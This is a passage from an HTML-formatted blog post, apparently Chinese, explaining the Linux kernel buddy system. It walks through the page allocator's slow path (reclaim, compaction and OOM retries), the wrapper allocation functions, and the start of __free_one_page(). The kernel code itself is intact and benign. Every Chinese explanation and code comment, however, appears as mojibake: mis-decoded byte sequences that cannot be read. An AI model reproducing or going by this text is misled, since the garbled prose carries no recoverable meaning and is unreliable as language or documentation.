INIT_COMPACT_PRIORITY;<br>&#125;<br>&#125;<br><br>retry:<br><span class="hljs-comment">/* ç¡®ä¿åªè¦æˆ‘ä»¬å¾ªç¯ï¼Œ kswapd ä¾¿ä¸ä¼šæ„å¤–åœ°ä¼‘çœ  */</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)<br>wake_all_kswapds(order, gfp_mask, ac);<br><br>reserve_flags = __gfp_pfmemalloc_flags(gfp_mask);<br><span class="hljs-keyword">if</span> (reserve_flags)<br>alloc_flags = current_alloc_flags(gfp_mask, reserve_flags);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥å†…å­˜ç­–ç•¥å¯ä»¥å¿½ç•¥ï¼Œé‡ç½® nodemask ä¸ zonelist è¿­ä»£å™¨ã€‚</span><br><span class="hljs-comment"> * è¿™äº›åˆ†é…å…·æœ‰é«˜ä¼˜å…ˆçº§ä¸ç³»ç»Ÿæ€§ï¼Œè€Œéç”¨æˆ·å¯¼å‘ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!(alloc_flags &amp; ALLOC_CPUSET) || reserve_flags) &#123;<br>ac-&gt;nodemask = <span class="hljs-literal">NULL</span>;<br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br>&#125;<br><br><span class="hljs-comment">/* å¸¦ç€å¯èƒ½è°ƒæ•´è¿‡ zonelist ä¸ alloc_flags å†æ¬¡å°è¯• */</span><br>page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* è°ƒç”¨æ–¹ä¸æƒ³è¦å›æ”¶, æˆ‘ä»¬æ— æ³•å¹³è¡¡ä»»ä½•äº‹ */</span><br><span class="hljs-keyword">if</span> (!can_direct_reclaim)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* é¿å…é€’å½’åœ°ç›´æ¥å›æ”¶ */</span><br><span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_MEMALLOC)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* å°è¯•ç›´æ¥å›æ”¶ååˆ†é… */</span><br>page = __alloc_pages_direct_reclaim(gfp_mask, order, alloc_flags, ac,<br>&amp;did_some_progress);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* å°è¯•ç›´æ¥ compaction ååˆ†é… */</span><br>page = __alloc_pages_direct_compact(gfp_mask, order, alloc_flags, ac,<br>compact_priority, &amp;compact_result);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* è‹¥æ˜¯ç‰¹åˆ«æŒ‡å®šçš„è¯·æ±‚ï¼Œä¸è¦å¾ªç¯ */</span><br><span class="hljs-keyword">if</span> (gfp_mask &amp; __GFP_NORETRY)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä¸è¦é‡è¯•é«˜èŠ±é”€çš„é«˜é˜¶åˆ†é…é™¤éä»–ä»¬æ˜¯</span><br><span class="hljs-comment"> * __GFP_RETRY_MAYFAIL</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (costly_order &amp;&amp; !(gfp_mask &amp; __GFP_RETRY_MAYFAIL))<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-keyword">if</span> (should_reclaim_retry(gfp_mask, order, ac, alloc_flags,<br> did_some_progress &gt; <span class="hljs-number">0</span>, &amp;no_progress_loops))<br><span class="hljs-keyword">goto</span> retry;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥0é˜¶çš„å›æ”¶æ— æ³•å–å¾—ä»»ä½•è¿›å±•ï¼Œåˆ™é‡è¯• compaction æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œ</span><br><span class="hljs-comment"> * å› ä¸ºå½“å‰å¯¹ compaction çš„å®ç°æ˜¯åŸºäºæœ‰è¶³å¤Ÿçš„ç©ºé—²å†…å­˜çš„</span><br><span class="hljs-comment"> *  (å‚è§ __compaction_suitable)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (did_some_progress &gt; <span class="hljs-number">0</span> &amp;&amp;<br>should_compact_retry(ac, order, alloc_flags,<br>compact_result, &amp;compact_priority,<br>&amp;compaction_retries))<br><span class="hljs-keyword">goto</span> retry;<br><br><br><span class="hljs-comment">/* åœ¨æˆ‘ä»¬å¼€å§‹ OOM killing ä¹‹å‰å¤„ç†å¯èƒ½çš„ cpuset æ›´æ–°ç«äº‰ */</span><br><span class="hljs-keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))<br><span class="hljs-keyword">goto</span> retry_cpuset;<br><br><span class="hljs-comment">/* å›æ”¶å¤±è´¥äº†, å¼€å§‹ killing ä¸€äº›ä¸œè¥¿ */</span><br>    <span class="hljs-comment">// è¦æ€ä¸€äº›è¿›ç¨‹æˆ–æ˜¯åˆ«çš„ä¸œè¥¿æ¥è…¾å†…å­˜äº†</span><br>page = __alloc_pages_may_oom(gfp_mask, order, ac, &amp;did_some_progress);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* åœ¨æ— å°½çš„å¾ªç¯ä¸­é¿å…æ²¡æœ‰æ°´ä½çº¿çš„åˆ†é… */</span><br><span class="hljs-keyword">if</span> (tsk_is_oom_victim(current) &amp;&amp;<br>    (alloc_flags &amp; ALLOC_OOM ||<br>     (gfp_mask &amp; __GFP_NOMEMALLOC)))<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* è‹¥ OOM killer å–å¾—äº†ä¸€äº›æˆæ•ˆï¼Œé‡è¯• */</span><br><span class="hljs-keyword">if</span> (did_some_progress) &#123;<br>no_progress_loops = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br>nopage:<br><span class="hljs-comment">/* åœ¨æˆ‘ä»¬å¤±è´¥ä¹‹å‰å¤„ç†å¯èƒ½çš„ cpuset çš„æ›´æ–°ç«äº‰ */</span><br><span class="hljs-keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))<br><span class="hljs-keyword">goto</span> retry_cpuset;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç¡®ä¿ __GFP_NOFAIL è¯·æ±‚æ²¡æœ‰æ³„éœ²ä¸”ç¡®ä¿æˆ‘ä»¬ä¸€ç›´åœ¨é‡è¯•</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (gfp_mask &amp; __GFP_NOFAIL) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ‰€æœ‰å­˜åœ¨çš„ __GFP_NOFAIL ç”¨æˆ·éƒ½æ˜¯å¯ä»¥è¢«é˜»å¡çš„, </span><br><span class="hljs-comment"> * æ•…å¯¹ä»»ä½•æ–°çš„å®é™…ä¸Šéœ€è¦ GFP_NOWAIT çš„ç”¨æˆ·è¿›è¡Œè­¦å‘Š</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(!can_direct_reclaim))<br><span class="hljs-keyword">goto</span> fail;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è¿™ä¸ªä¸Šä¸‹æ–‡çš„ PF_MEMALLOC è¯·æ±‚éå¸¸å¥‡æ€ª</span><br><span class="hljs-comment"> * å› ä¸ºæˆ‘ä»¬ä¸èƒ½å›æ”¶ä»»ä½•ä¸œè¥¿åªèƒ½å¾ªç¯ç­‰å¾…</span><br><span class="hljs-comment"> * æŸäººæ¥ä¸ºæˆ‘ä»¬åšäº›ä»€ä¹ˆ</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE(current-&gt;flags &amp; PF_MEMALLOC);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ— å¤±è´¥çš„é«˜å¼€é”€çš„ orders æ˜¯ä¸€é¡¹è‰°å·¨çš„è¦æ±‚ï¼Œ</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¯¹æ­¤å¹¶æ²¡æœ‰å¤ªå¤šå‡†å¤‡ï¼Œæ•…è®©æˆ‘ä»¬è­¦å‘Šè¿™äº›ç”¨æˆ·</span><br><span class="hljs-comment"> * ä»¥ä¾¿äºæˆ‘ä»¬èƒ½å¤Ÿè¯†åˆ«å‡ºä»–ä»¬å¹¶å°†ä¹‹è½¬åŒ–ä¸ºåˆ«çš„ä¸œè¥¿</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE(order &gt; PAGE_ALLOC_COSTLY_ORDER);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é€šè¿‡è®©ä»–ä»¬èƒ½è®¿é—®ä¿ç•™çš„å†…å­˜æ¥å¸®åŠ©éå¤±è´¥çš„åˆ†é…</span><br><span class="hljs-comment"> * ä½†ä¸ä½¿ç”¨ ALLOC_NO_WATERMARKS å› ä¸ºè¿™å¯èƒ½</span><br><span class="hljs-comment"> * å¤§é‡å‡å°‘å†…å­˜ä¿ç•™åŒºè€Œè®©æƒ…å†µæ›´å</span><br><span class="hljs-comment"> */</span><br>page = __alloc_pages_cpuset_fallback(gfp_mask, order, ALLOC_HARDER, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br>cond_resched();<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>fail:<br>warn_alloc(gfp_mask, ac-&gt;nodemask,<br><span class="hljs-string">&quot;page allocation failure: order:%u&quot;</span>, order);<br>got_pg:<br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å…ˆè¡¥å……ä¸€ä¸ªæ¦‚å¿µâ€”â€”<code>Memory compaction</code> æœºåˆ¶ï¼Œå…¶å®å°±æ˜¯æ•´ç†å†…å­˜ç¢ç‰‡ï¼Œå¯¹é›¶æ•£çš„å†…å­˜é¡µè¿›è¡Œè¿ç§»ï¼Œä»è€Œå°†é›¶æ•£çš„ç©ºé—²å†…å­˜é¡µå˜æˆå¤§å—çš„ç©ºé—²å†…å­˜ï¼Œä¸è¿‡è¿™é‡Œåªæ•´ç†å¯ä»¥ç§»åŠ¨çš„ç¢ç‰‡ï¼š</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="ä»çŸ¥ä¹å·çš„å›¾.png"></p><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹æ…¢é€Ÿåˆ†é…çš„æ•´ä¸ªæµç¨‹ï¼š</p><ul><li>ä½¿ç”¨åŸæœ‰çš„ gfp_flag é‡æ–°è®¾ç½® alloc_flagï¼Œå¹¶é‡æ–°è®¡ç®— preferred zoneï¼Œè‹¥è®¾ç½®äº† <code>ALLOC_KSWAPD</code> åˆ™è°ƒç”¨ <code>wake_all_kswapds()</code> å”¤é†’ kswapd çº¿ç¨‹è¿›è¡Œå†…å­˜å›æ”¶</li><li>ä¹‹åé‡æ–°å°è¯•å¿«é€Ÿè·¯å¾„çš„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>æ¥ä¸‹æ¥è°ƒç”¨ <code>__alloc_pages_direct_compact()</code> è¿›è¡Œ compactionï¼Œè¯¥å‡½æ•°å†…éƒ¨åœ¨æ•´ç†å®Œåä¼šé‡æ–°å°è¯•å¿«é€Ÿè·¯å¾„çš„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>ï¼ˆretryï¼‰æ¥ä¸‹æ¥è°ƒç”¨ <code>wake_all_kswapds()</code> å”¤é†’ kswapd çº¿ç¨‹è¿›è¡Œå†…å­˜å›æ”¶</li><li>è°ƒæ•´ zonelist ä¸ alloc_flagï¼Œä¹‹åå†æ¬¡å°è¯•å¿«é€Ÿè·¯å¾„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>è‹¥ gfp_flag ä¸­æ²¡æœ‰ <code>__GFP_DIRECT_RECLAIM</code> æˆ–æ˜¯è¿›ç¨‹ PCB çš„ flag ä¸­æœ‰ <code>PF_MEMALLOC</code>ï¼Œç›´æ¥è·³è½¬åˆ° ï¼ˆnopageï¼‰</li><li>è°ƒç”¨ <code>__alloc_pages_direct_reclaim()</code> è¿›è¡Œå†…å­˜å›æ”¶ï¼ˆå†…éƒ¨è°ƒç”¨ <code>__perform_reclaim()</code>ï¼‰ä¸å¿«é€Ÿè·¯å¾„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>è°ƒç”¨ <code>__alloc_pages_direct_compact()</code> è¿›è¡Œ compaction ä¸å¿«é€Ÿè·¯å¾„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>å¦‚æœè®¾ç½®äº† <code>__GFP_NORETRY</code> ï¼Œæˆ–æ˜¯è¯¥æ¬¡å†…å­˜åˆ†é…å¼€é”€è¾ƒé«˜ï¼ˆ<code>order &gt; PAGE_ALLOC_COSTLY_ORDER</code>ï¼‰ä¸”æœªè®¾ç½® <code>__GFP_RETRY_MAYFAIL</code>ï¼Œç›´æ¥è·³åˆ° ï¼ˆnopageï¼‰</li><li>è°ƒç”¨ <code>should_reclaim_retry()</code> åˆ¤æ–­æ˜¯å¦éœ€è¦é‡æ–°å›æ”¶ï¼Œè‹¥æ˜¯åˆ™è·³å›ï¼ˆretryï¼‰</li><li>è°ƒç”¨ <code>should_compact_retry()</code> åˆ¤æ–­æ˜¯å¦éœ€è¦é‡æ–°è¿›è¡Œ compactionï¼Œè‹¥æ˜¯åˆ™è·³å›ï¼ˆretryï¼‰</li><li>è°ƒç”¨ <code>check_retry_cpuset()</code> æ£€æŸ¥ cpuset æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œè‹¥æ˜¯åˆ™è·³è½¬å›å¼€å¤´</li><li>è°ƒç”¨ <code>__alloc_pages_may_oom()</code> å°è¯• kill ä¸€äº›è¿›ç¨‹æ¥é‡Šæ”¾å†…å­˜ï¼Œè¯¥å‡½æ•°å†…é¦–å…ˆè¿˜æ˜¯ä¼šå…ˆè¿›è¡Œä¸€æ¬¡å¿«é€Ÿåˆ†é…ï¼Œä¹‹åæ‰æ˜¯è°ƒç”¨ <code>out_of_memory()</code> æ¥æ€æ‰æœ€é€‚åˆçš„è¿›ç¨‹ä»¥é‡Šæ”¾å†…å­˜ï¼Œæœ€åè‹¥è®¾ç½®äº† <code>__GFP_NOFAIL</code> åˆ™è°ƒç”¨ <code>__alloc_pages_cpuset_fallback()</code> å†æ¬¡å°è¯•å†…å­˜åˆ†é…ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä¼šä¸¤æ¬¡èµ°å¿«é€Ÿè·¯å¾„è¿›è¡Œåˆ†é…ï¼ˆç¬¬ä¸€æ¬¡ä¼šé¢å¤–é™„åŠ ä¸Š <code>ALLOC_CPUSET</code> çš„ flagï¼‰</li><li>å¦‚æœæŠŠå½“å‰è¿›ç¨‹æ€æ‰äº†ï¼Œè·³åˆ°ï¼ˆnopageï¼‰ï¼›å¦‚æœæ€è¿›ç¨‹å–å¾—äº†æˆæ•ˆï¼Œè·³å›ï¼ˆretryï¼‰</li><li>ï¼ˆnopageï¼‰è°ƒç”¨ <code>check_retry_cpuset()</code> æ£€æŸ¥ cpuset æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œè‹¥æ˜¯åˆ™è·³è½¬å›å¼€å¤´</li><li>è‹¥è®¾ç½®äº† <code>__GFP_NOFAIL</code> åˆ™è¿›è¡Œä¸€ç³»åˆ—çš„è­¦å‘Šï¼Œå¹¶è°ƒç”¨ <code>__alloc_pages_cpuset_fallback()</code> å†æ¬¡å°è¯•å†…å­˜åˆ†é…ï¼Œè‹¥æœªæˆåŠŸåˆ™è·³å›ï¼ˆretryï¼‰</li><li>è¿”å›ç»“æœ</li></ul><p><img src="https://s2.loli.net/2022/07/06/eCg12KJIZuw9aon.png" alt="image.png"></p><h2 id="å››ã€ä¸Šå±‚å°è£…åˆ†é…å‡½æ•°"><a href="#å››ã€ä¸Šå±‚å°è£…åˆ†é…å‡½æ•°" class="headerlink" title="å››ã€ä¸Šå±‚å°è£…åˆ†é…å‡½æ•°"></a>å››ã€<em>ä¸Šå±‚å°è£…åˆ†é…å‡½æ•°</em></h2><p>åœ¨ <code>__alloc_pages_nodemask()</code> ä¸Šå±‚ä¸»è¦æœ‰ä¸‰ä¸ªé¡µé¢åˆ†é…å‡½æ•°ï¼Œå…¶è°ƒç”¨è·¯å¾„å¦‚ä¸‹ï¼š</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__alloc_pages_node</span>  <span class="hljs-comment">/*è¿”å›struct pageçš„æŒ‡é’ˆ*/</span><br>    <span class="hljs-variable">__alloc_pages</span><br>    <span class="hljs-variable">__alloc_pages_nodemask</span><br><br>alloc_pages         <span class="hljs-comment">/*è¿”å›struct pageçš„æŒ‡é’ˆ*/</span><br>    alloc_pages_current<br>    <span class="hljs-variable">__alloc_pages_nodemask</span><br>        <br><span class="hljs-variable">__get_free_pages</span>    <span class="hljs-comment">/*è¿”å›é¡µé¢çš„è™šæ‹Ÿåœ°å€*/</span><br>    alloc_pages<br>        alloc_pages_current<br>            <span class="hljs-variable">__alloc_pages_nodemask</span><br></code></pre></td></tr></table></figure><h1 id="0x03-é¡µçš„é‡Šæ”¾"><a href="#0x03-é¡µçš„é‡Šæ”¾" class="headerlink" title="0x03.é¡µçš„é‡Šæ”¾"></a>0x03.é¡µçš„é‡Šæ”¾</h1><p>å‰é¢æˆ‘ä»¬è®²äº†é¡µé¢æ˜¯å¦‚ä½•åˆ†é…çš„ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹é¡µé¢æ˜¯å¦‚ä½•é‡Šæ”¾çš„</p><h2 id="ä¸€ã€-free-one-page-ï¼šé‡Šæ”¾é¡µé¢çš„æ ¸å¿ƒå‡½æ•°"><a href="#ä¸€ã€-free-one-page-ï¼šé‡Šæ”¾é¡µé¢çš„æ ¸å¿ƒå‡½æ•°" class="headerlink" title="ä¸€ã€__free_one_page()ï¼šé‡Šæ”¾é¡µé¢çš„æ ¸å¿ƒå‡½æ•°"></a>ä¸€ã€__free_one_page()ï¼šé‡Šæ”¾é¡µé¢çš„æ ¸å¿ƒå‡½æ•°</h2><p>è¯¥å‡½æ•°æ˜¯ buddy system ä¸­ç”¨ä»¥è¿›è¡Œé¡µé¢é‡Šæ”¾çš„<strong>æ ¸å¿ƒå‡½æ•°</strong>ï¼Œæ‰€æœ‰çš„é¡µé¢é‡Šæ”¾ API éƒ½æ˜¯åŸºäºè¯¥å‡½æ•°çš„å°è£…</p><p>è¯¥å‡½æ•°å®šä¹‰äº <code>/mm/page_alloc.c</code> ä¸­ï¼Œä¸»è¦ä½œç”¨æ˜¯å°†ç‰¹å®šé¡µé¢é‡Šæ”¾åˆ°ç‰¹å®š zone ä¸Šï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„ <code>one page</code> ä¸æ˜¯ä¸€å¼ é¡µæ¡†è€Œæ˜¯ä¸€å—è¿ç»­å†…å­˜ï¼ˆå¯èƒ½æœ‰å¤šå¼ é¡µï¼‰</p><p>è¿˜éœ€è¦æ³¨æ„çš„æ˜¯è¿™æ˜¯ä¸€ä¸ªé‡Šæ”¾é¡µé¢çš„<strong>åŸºæœ¬å‡½æ•°</strong>ï¼Œæ•…æˆ‘ä»¬éœ€è¦æä¾›å¾…é‡Šæ”¾é¡µé¢çš„é¡µç»“æ„ä½“ï¼ˆstruct pageï¼‰ã€é¡µæ¡†å·ã€é¡µé¢å—çš„é˜¶ï¼ˆorderï¼‰ã€ç›®æ ‡ zoneã€è¿ç§»ç±»å‹ç­‰ä¿¡æ¯â€”â€”è¿™äº›ä¿¡æ¯é€šå¸¸ç”±ä¸Šå±‚å°è£…å‡½æ•°æä¾›ï¼Œè¿™ä¸ªå‡½æ•°æ‰€åšçš„åªæ˜¯ç®€å•åœ°å°†é¡µæŒ‚å›å¯¹åº”é“¾è¡¨å¹¶æ£€æŸ¥åˆå¹¶çš„æ“ä½œ</p><p>å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * buddy system åˆ†é…å™¨çš„é‡Šæ”¾å‡½æ•°.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * buddy system çš„æƒ³æ³•æ˜¯ä¸ºå¤šç§â€œordersâ€çš„å†…å­˜å—</span><br><span class="hljs-comment"> * ç»´æŠ¤ä¸€ä¸ªç›´æ¥æ˜ å°„è¡¨ï¼ˆåŒ…å«ä½å€¼ï¼‰. åº•éƒ¨çº§åˆ«çš„è¡¨åŒ…å«</span><br><span class="hljs-comment"> * å¯¹æœ€å°çš„å¯åˆ†é…å†…å­˜å•å…ƒï¼ˆè¿™é‡Œä¾¿æ˜¯é¡µé¢ï¼‰çš„æ˜ å°„,</span><br><span class="hljs-comment"> * è€Œå¾€ä¸Šæ¯æ›´é«˜ä¸€çº§åˆ™æè¿°äº†ä»å…¶ä¸‹çš„ä¸€çº§çš„ä¸€å¯¹å•å…ƒï¼Œå› æ­¤æ˜¯&quot;buddies&quot;.</span><br><span class="hljs-comment"> * ä»é«˜å±‚çœ‹ï¼Œè¿™é‡Œæ‰€åšçš„ä»…æ˜¯åœ¨æ ‡è®°åº•å±‚å¯ç”¨çš„è¡¨é¡¹ï¼Œ</span><br><span class="hljs-comment"> * å¹¶æ ¹æ®éœ€è¦å‘ä¸Šä¼ æ’­æ›´æ”¹ï¼Œå†åŠ ä¸Šä¸€äº›ä¸ VM ç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†</span><br><span class="hljs-comment"> * è‰¯å¥½åä½œæ‰€éœ€è¦çš„è®¡æ•°ã€‚</span><br><span class="hljs-comment"> * åœ¨æ¯ä¸ªçº§åˆ«, æˆ‘ä»¬éƒ½ä¿æŒä¸€ä¸ª pages çš„ list, ä½œä¸ºè¿ç»­çš„</span><br><span class="hljs-comment"> * é•¿åº¦ä¸º(1 &lt;&lt; order)çš„ç©ºé—²é¡µçš„å¤´èŠ‚ç‚¹å¹¶æ ‡è®°ä¸Š PageBuddy.</span><br><span class="hljs-comment"> * Page&#x27;s order è¢«è®°å½•åœ¨ page_private(page) åŸŸ.</span><br><span class="hljs-comment"> * æ•…å½“æˆ‘ä»¬åœ¨åˆ†é…æˆ–é‡Šæ”¾å…¶ä¸€æ—¶, æˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦ä¸€ä¸ªçš„çŠ¶æ€ã€‚</span><br><span class="hljs-comment"> * ä¹Ÿå°±æ˜¯è¯´ï¼Œè‹¥æˆ‘ä»¬åˆ†é…ä¸€ä¸ªå°çš„å—ï¼Œè€Œä¸¤ä¸ªéƒ½æ˜¯ç©ºé—²çš„ï¼Œ</span><br><span class="hljs-comment"> * åŒºåŸŸçš„å‰©ä½™éƒ¨åˆ†å¿…é¡»è¢«åˆ†å‰²æˆå—. è‹¥ä¸€ä¸ªå—è¢«é‡Šæ”¾äº†ï¼Œ</span><br><span class="hljs-comment"> * è€Œä»–çš„ buddy ä¹Ÿæ˜¯é—²ç½®çš„, é‚£ä¹ˆè¿™å°†è§¦å‘åˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„å—</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * -- nyc</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __free_one_page(<span class="hljs-keyword">struct</span> page *page,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pfn,<br><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,<br><span class="hljs-type">int</span> migratetype, <span class="hljs-type">fpi_t</span> fpi_flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">capture_control</span> *<span class="hljs-title">capc</span> =</span> task_capc(zone);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buddy_pfn;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> combined_pfn;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_order;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">buddy</span>;</span><br><span class="hljs-type">bool</span> to_tail;<br><br>    <span class="hljs-comment">// è¿™é‡Œçš„ MAX_ORDER å’Œ pageblock_order éƒ½æ˜¯å®</span><br>max_order = <span class="hljs-type">min_t</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, MAX_ORDER - <span class="hljs-number">1</span>, pageblock_order);<br><br>VM_BUG_ON(!zone_is_initialized(zone));<br>VM_BUG_ON_PAGE(page-&gt;flags &amp; PAGE_FLAGS_CHECK_AT_PREP, page);<br><br>VM_BUG_ON(migratetype == <span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (likely(!is_migrate_isolate(migratetype)))<br>__mod_zone_freepage_state(zone, <span class="hljs-number">1</span> &lt;&lt; order, migratetype);<br><br>VM_BUG_ON_PAGE(pfn &amp; ((<span class="hljs-number">1</span> &lt;&lt; order) - <span class="hljs-number">1</span>), page);<br>VM_BUG_ON_PAGE(bad_range(zone, page), page);<br><br>continue_merging:<br><span class="hljs-keyword">while</span> (order &lt; max_order) &#123;<br><span class="hljs-keyword">if</span> (compaction_capture(capc, page, order, migratetype)) &#123;<br>__mod_zone_freepage_state(zone, -(<span class="hljs-number">1</span> &lt;&lt; order),<br>migratetype);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>buddy_pfn = __find_buddy_pfn(pfn, order);<span class="hljs-comment">// è®¡ç®— buddy é¡µæ¡†å·</span><br>buddy = page + (buddy_pfn - pfn);<span class="hljs-comment">// è®¡ç®— buddy çš„é¡µç»“æ„ä½“ï¼Œæ³¨æ„è¿™é‡Œæ˜¯æŒ‡é’ˆåŠ æ³•</span><br><br><span class="hljs-keyword">if</span> (!pfn_valid_within(buddy_pfn)) <span class="hljs-comment">// é¡µæ¡†å·åˆæ³•æ€§æ£€æŸ¥</span><br><span class="hljs-keyword">goto</span> done_merging;<br><span 